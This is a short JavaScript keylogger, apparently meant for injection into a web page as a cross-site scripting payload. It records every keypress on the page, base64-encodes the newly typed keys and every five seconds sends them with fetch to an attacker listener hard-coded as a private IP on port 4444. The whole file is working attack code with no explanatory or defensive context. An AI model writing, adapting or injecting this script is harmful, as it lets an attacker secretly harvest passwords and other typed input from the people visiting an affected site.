const LHOST = '10.4.1.239';
const PORT = '4444';
let keys = '';
let sent_keys = '';

document.onkeypress = function(e) {
    keys += e.key;
}

setInterval(async function() {
    let sending_keys = keys.replace(sent_keys, '');
    if(sending_keys) {
	sent_keys += sending_keys;
	await fetch(`http://${LHOST}:${PORT}?key=` + btoa(sending_keys));
    }
}, 5000)
